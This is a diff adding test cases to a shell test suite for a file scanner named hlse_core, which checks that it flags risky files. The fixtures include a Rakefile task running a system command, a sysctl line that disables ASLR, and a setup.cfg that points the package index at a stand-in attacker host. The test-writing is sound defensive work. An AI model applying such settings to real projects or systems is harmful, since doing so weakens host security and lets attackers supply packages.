@@ -9805,6 +9805,38 @@ rm -rf "$XDIR72"
     && check "text: benign deposit notice clean" "0" "0" \
     || check "text: benign deposit notice clean" "0" "1"
 
+# ── cycle-75: rake task exec + sysctl hardening + sched ACL + setup.cfg ──
+XDIR75=$(mktemp -d "${TMPDIR:-/tmp}/hlse75.XXXXXX")
+printf 'task :x do\n  system "id"\nend\n' > "$XDIR75/Rakefile"
+./hlse_core file "$XDIR75/Rakefile" 2>&1 | grep -q "ALERT\|BLOCK" \
+    && check "file: Rakefile system exec flagged" "0" "0" \
+    || check "file: Rakefile system exec flagged" "0" "1"
+printf 'task :build do\n  puts "ok"\nend\n' > "$XDIR75/Rakefile"
+./hlse_core file "$XDIR75/Rakefile" 2>&1 | grep -q "ALERT\|BLOCK" \
+    && check "file: benign Rakefile clean" "0" "1" \
+    || check "file: benign Rakefile clean" "0" "0"
+printf 'kernel.randomize_va_space=0\n' > "$XDIR75/sysctl.conf"
+./hlse_core file "$XDIR75/sysctl.conf" 2>&1 | grep -q "ALERT" \
+    && check "file: ASLR-off sysctl flagged" "0" "0" \
+    || check "file: ASLR-off sysctl flagged" "0" "1"
+printf 'net.ipv4.ip_forward=1\n' > "$XDIR75/sysctl.conf"
+./hlse_core file "$XDIR75/sysctl.conf" 2>&1 | grep -q "ALERT\|BLOCK" \
+    && check "file: benign sysctl clean" "0" "1" \
+    || check "file: benign sysctl clean" "0" "0"
+printf 'u\n' > "$XDIR75/cron.deny"
+./hlse_core file "$XDIR75/cron.deny" 2>&1 | grep -q "LOG\|ALERT" \
+    && check "file: cron.deny ACL flagged" "0" "0" \
+    || check "file: cron.deny ACL flagged" "0" "1"
+printf '[easy_install]\nindex_url = http://evil.example/\n' > "$XDIR75/setup.cfg"
+./hlse_core file "$XDIR75/setup.cfg" 2>&1 | grep -q "ALERT" \
+    && check "file: setup.cfg index_url flagged" "0" "0" \
+    || check "file: setup.cfg index_url flagged" "0" "1"
+printf '[options]\npackages=find:\n' > "$XDIR75/setup.cfg"
+./hlse_core file "$XDIR75/setup.cfg" 2>&1 | grep -q "ALERT\|BLOCK" \
+    && check "file: benign setup.cfg clean" "0" "1" \
+    || check "file: benign setup.cfg clean" "0" "0"
+rm -rf "$XDIR75"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
